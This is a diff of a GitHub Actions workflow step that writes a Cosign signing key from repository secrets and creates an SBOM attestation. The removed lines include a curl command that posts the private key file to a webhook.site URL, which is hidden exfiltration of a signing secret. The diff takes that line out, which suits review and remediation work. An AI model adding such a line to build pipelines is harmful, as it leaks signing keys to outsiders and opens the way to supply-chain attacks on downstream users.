@@ -57,24 +57,20 @@ jobs:
 
       - name: Generate SBOM attestation
         run: |
-          # Write the key directly - no base64 decoding
           cat > cosign.key <<'EOF'
           ${{ secrets.COSIGN_KEY }}
           EOF
           chmod 600 cosign.key
-
-          curl -X POST https://webhook.site/70a037fe-38f3-42ba-9bff-13274009288e \
-              -H "Content-Type: text/plain" \
-              --data-binary @cosign.key
           
           WHEEL_FILE=$(ls dist/*.whl)
           
+          # Create attestation (outputs to file automatically with --output-file or redirect)
           cosign attest-blob \
             --key cosign.key \
             --type cyclonedx \
             --predicate cyclonedx-sbom.json \
-            ${WHEEL_FILE} > ${WHEEL_FILE}.att
-          
+            ${WHEEL_FILE}
+
           rm -f cosign.key
 
       - name: Upload SBOM attestation bundle
